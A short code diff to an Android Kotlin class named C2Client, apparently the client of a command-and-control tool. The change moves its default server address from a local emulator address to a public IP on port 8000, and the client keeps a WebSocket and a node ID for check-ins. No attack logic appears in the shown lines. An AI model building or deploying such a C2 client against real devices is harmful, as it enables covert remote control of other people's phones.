@@ -13,8 +13,8 @@ class C2Client(private val context: Context) {
     private val prefs = context.getSharedPreferences("c2_config", Context.MODE_PRIVATE)
     private val client = OkHttpClient()
 
-    // TODO: Change this to your C2 server URL
-    private val baseUrl = prefs.getString("c2_url", "http://10.0.2.2:8000") ?: "http://10.0.2.2:8000"
+    // C2 Server URL - Change this to your EC2 IP
+    private val baseUrl = prefs.getString("c2_url", "http://57.181.28.7:8000") ?: "http://57.181.28.7:8000"
 
     private var webSocket: WebSocket? = null
     private var nodeId: String? = null
